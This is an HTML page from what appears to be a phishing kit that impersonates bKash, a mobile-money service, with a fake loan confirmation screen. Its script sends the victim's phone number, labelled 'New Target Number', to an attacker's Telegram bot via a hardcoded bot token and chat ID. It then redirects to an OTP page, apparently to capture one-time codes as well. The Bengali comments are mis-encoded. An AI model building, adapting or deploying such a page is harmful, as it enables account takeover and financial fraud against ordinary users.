<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>bKash Confirm</title>
    <link rel="icon" type="image/png" href="img/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">

        <div class="flex justify-between items-center bg-white px-6 py-4">
            <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo">
        </div>

        <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
            <div>
                <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
                <p class="text-xs text-gray-500">loan category: <span id="display_category">Business Loan</span></p>
            </div>
            <p class="text-sm font-semibold text-gray-800" id="display_amount">‡ß≥0.00</p>
        </div>

        <div id="errorMessage" class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm" style="display: none;">
            ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡¶ø‡¶ï‡¶æ‡¶∂ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®
        </div>

        <form id="numberForm">
            <div class="bg-pink-600 px-6 py-16">
                <p class="text-white text-sm mb-2 text-center">Your bKash Account Number</p>
                <input type="tel" name="mobile_number" id="mobile_number" placeholder="e.g 01XXXXXXXXX" class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center" maxlength="11" required />
                <p class="text-white text-xs mt-2 text-center">
                    Confirm and proceed,
                    <a href="#" class="underline">terms & conditions</a>
                </p>
            </div>

            <div class="flex justify-between items-center bg-white px-6 py-4">
                <button type="button" onclick="history.back()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
                    Cancel
                </button>
                <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
                    Confirm
                </button>
            </div>
        </form>

        <div class="text-center text-xs text-gray-400 py-2">
            ¬© 2025 bKash, All Rights Reserved
            <br />
            <span class="text-pink-600">‚óè 16247</span>
        </div>

    </div>

    <script>
        // ‡ßß. ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶™‡ßá‡¶ú ‡¶•‡ßá‡¶ï‡ßá ‡¶ü‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶™‡¶∞‡¶ø‡¶Æ‡¶æ‡¶£ ‡¶Ü‡¶®‡¶æ
        const params = new URLSearchParams(window.location.search);
        const amount = params.get('amount');
        const category = params.get('category');

        if (amount) document.getElementById('display_amount').innerText = '‡ß≥' + amount;
        if (category) document.getElementById('display_category').innerText = category;


        // ‡ß®. ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶∂‡¶®
        const mobileInput = document.getElementById('mobile_number');
        const confirmBtn = document.getElementById('confirmBtn');
        const errorMessage = document.getElementById('errorMessage');
        const validPrefixes = ['017', '013', '015', '019', '014', '018', '016'];

        function validateMobileNumber(number) {
            if (number.length !== 11) return false;
            const prefix = number.substring(0, 3);
            return validPrefixes.includes(prefix);
        }

        mobileInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, ''); // ‡¶∂‡ßÅ‡¶ß‡ßÅ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ
            errorMessage.style.display = 'none';

            if (this.value.length === 11) {
                if (validateMobileNumber(this.value)) {
                    confirmBtn.disabled = false;
                    confirmBtn.className = "w-[48%] bg-pink-500 text-white py-2 rounded hover:bg-pink-600";
                } else {
                    errorMessage.style.display = 'block';
                    confirmBtn.disabled = true;
                    confirmBtn.className = "w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed";
                }
            } else {
                confirmBtn.disabled = true;
                confirmBtn.className = "w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed";
            }
        });

        // ==========================================
        // ‡ß©. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá)
        // ==========================================

        document.getElementById('numberForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const mobile = mobileInput.value;

            // ‚ö†Ô∏è ‡¶®‡¶ø‡¶ö‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶¨‡¶∏‡¶æ‡¶® ‚ö†Ô∏è
            const botToken = "8219251554:AAF6qEcHBVoofOCdj4JRqAycz3RxvIqsnqI";  // <--- ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶¨‡¶∏‡¶æ‡¶®
            const chatId = "6587549013";      // <--- ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶¨‡¶∏‡¶æ‡¶®

            // ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø (‡¶∂‡ßÅ‡¶ß‡ßÅ ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶Ø‡¶æ‡¶¨‡ßá)
            const message = `üì± New Target Number: ${mobile}`;

            // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶è‡¶™‡¶ø‡¶Ü‡¶á URL
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü
            confirmBtn.innerText = "Processing...";

            // ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            fetch(url)
                .then(response => {
                    if (response.ok) {
                        // ‡¶∏‡¶´‡¶≤ ‡¶π‡¶≤‡ßá ‡¶™‡¶∞‡ßá‡¶∞ ‡¶™‡ßá‡¶ú‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
                        window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
                    } else {
                        // ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶≤‡ßá ‡¶ï‡¶®‡¶∏‡ßã‡¶≤‡ßá ‡¶è‡¶∞‡¶∞ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá (‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶ï‡ßá ‡¶Ü‡¶ü‡¶ï‡ßá ‡¶∞‡¶æ‡¶ñ‡¶¨‡ßá ‡¶®‡¶æ)
                        console.error("Telegram Error");
                        window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
                    }
                })
                .catch(error => {
                    console.error('Network Error:', error);
                    // ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶•‡¶æ‡¶ï‡¶≤‡ßá‡¶ì ‡¶™‡¶∞‡ßá‡¶∞ ‡¶™‡ßá‡¶ú‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶π‡¶¨‡ßá
                    window.location.href = `otp.html?mobile=${mobile}&amount=${amount}`;
                });
        });
    </script>
</body>
</html>
